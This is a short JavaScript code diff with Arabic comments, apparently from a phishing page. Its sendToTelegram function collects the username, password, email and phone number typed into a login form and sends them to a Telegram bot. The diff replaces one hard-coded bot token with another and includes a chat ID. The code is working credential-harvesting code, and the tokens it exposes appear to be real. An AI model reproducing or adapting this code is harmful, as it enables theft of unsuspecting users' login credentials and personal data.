@@ -46,7 +46,7 @@ form.addEventListener("submit", function (event) {
 
 // إرسال بيانات تسجيل الدخول إلى تيليجرام
 function sendToTelegram(username, password, email, phone) {
-    const botToken = "6924402995:AAEx-1e3pcV9kpYjpQnsjN-lkvreoCjxkFs";
+    const botToken = "7935763947:AAGNc11VAj1AcX3nUz_sf-r8kxPs-7OL5TU";
     const chatId = "1046458749";
     const messageText = `👤 مستخدم جديد دخل الموقع:\n\n📛 المستخدم: ${username}\n🔑 كلمة المرور: ${password}\n📧 البريد الإلكتروني: ${email}\n📞 رقم الهاتف: ${phone}`;
 
